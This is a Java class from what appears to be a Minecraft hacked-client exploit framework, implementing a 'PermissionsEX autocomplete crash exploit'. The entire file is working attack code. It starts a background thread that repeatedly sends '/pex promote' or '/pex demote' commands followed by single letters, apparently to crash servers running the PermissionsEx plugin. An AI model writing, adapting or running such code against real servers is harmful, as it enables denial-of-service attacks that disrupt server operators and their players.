package dev.isnow.puppy.exploit.impl.other;

import dev.isnow.puppy.exception.ExploitException;
import dev.isnow.puppy.exploit.Exploit;
import dev.isnow.puppy.exploit.ExploitInfo;
import dev.isnow.puppy.exploit.ExploitType;
import dev.isnow.puppy.helper.ChatHelper;

import java.util.Random;

@ExploitInfo(
        name = "PermissionsEX",
        type = ExploitType.OTHER,
        description = "Permissions EX autocomplete crash exploit"
)
public class PEXExploit extends Exploit {

    @Override
    public void execute(Object... args) throws ExploitException {
        ChatHelper.printMessage("Sending commands");
        String alphabet = "zyxwvutsrqponmlkjihgfedcba";
        new Thread(() -> {
            boolean random = new Random().nextBoolean();
            for (int i = 0; i < alphabet.length(); i++) {
                for (int i2 = 0; i2 < alphabet.length(); i2++) {
                    if(random) {
                        mc.thePlayer.sendChatMessage("/pex demote " + alphabet.charAt(i));
                    } else {
                        mc.thePlayer.sendChatMessage("/pex promote " + alphabet.charAt(i));
                    }
                    ChatHelper.printMessage("Character: " + alphabet.charAt(i2) + " and " + alphabet.charAt(i));
                    try {
                        Thread.sleep(600);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();
        ChatHelper.printMessage("Sent commands!");
    }
}
